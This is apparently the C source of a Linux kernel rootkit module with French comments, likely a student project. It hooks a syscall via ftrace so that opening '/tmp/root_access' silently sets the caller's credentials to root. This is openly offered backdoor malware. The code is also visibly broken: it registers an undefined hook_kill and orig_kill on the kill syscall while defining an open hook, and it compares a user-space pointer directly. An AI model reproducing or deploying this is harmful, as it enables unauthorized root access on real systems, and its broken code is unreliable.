#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#include "ftrace_helper.h"

// licence du module (GPL = General Public License) en gros opensource
// le LKM sera marqué comme propriétaire si on ne mets pas ca et si le noyau impose des restrictions sur les modules propriétaires, ca peut poser des problemes
MODULE_LICENSE("GPL");
MODULE_AUTHOR("victor, marouane, mina, axel");
// pour avoir la description quand on fait modinfo 
MODULE_DESCRIPTION("Hide LKM");
MODULE_VERSION("0.01");

// check la version du kernel, pt_regs pour les syscall en 4.17 ou plus
#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

// si PTREGS_SYSCALL_STUBS est défini, on inclut les stubs pour les syscall
#ifdef PTREGS_SYSCALL_STUBS
// Pointeur vers la f° open pour save ses fonction d'origine
static asmlinkage long (*orig_open)(const struct pt_regs *);

// f° hooké qui remplace le syscall kill
asmlinkage int hook_open(const struct pt_regs *regs)
{
    void set_root(void);

    // Obtenir le nom du fichier que l'utilisateur essaie d'ouvrir
    char __user *filename = (char *) regs->di;

    // Vérifier si le fichier demandé est /tmp/root_access
    if (strcmp(filename, "/tmp/root_access") == 0)
    {
        printk(KERN_INFO "rootkit: Giving root privilege ...\n");
        set_root();
        return 0;
    }

    // si c'est pas le bon fichier, on appelle la f° d'origine
    return orig_open(regs);
}

#else
static asmlinkage long (*orig_open)(const char __user *filename, int flags, mode_t mode);

static asmlinkage int hook_open(const char __user *filename, int flags, mode_t mode)
{
    void set_root(void);

    if (strcmp(filename, "/tmp/root_access") == 0)
    {
        printk(KERN_INFO "rootkit: Giving root access via open...\n");
        set_root();
        return 0;
    }

    return orig_open(filename, flags, mode);
}
#endif

void set_root(void)
{
    struct cred *root;
    // on récupère les credentials actuels du processus (uid, gid, etc)
    root = prepare_creds();

    if (root == NULL)
        return;
    
    // on mets tout a 0, ducoup on est root :)
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    // ca c'est pour appliquer "réellement" les changements
    commit_creds(root);
}

// tableau de struct ftrace_hook pour def l'appel qu'on veut hook
static struct ftrace_hook hooks[] = {
    // ici on appel la f° __x64_sys_kill et on lui passe notre f° hook_kill
    // &orig_kill est un pointeur vers la f° d'origine pour la réutiliser si le flag est pas 64
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};

static int __init rootkit_init(void)
{
    int err;
    // installe les hooks (la f° est dans ftrace_helper.h)
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    return 0;
}

static void __exit rootkit_exit(void)
{
    // enlève le hook
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(rootkit_init);
module_exit(rootkit_exit);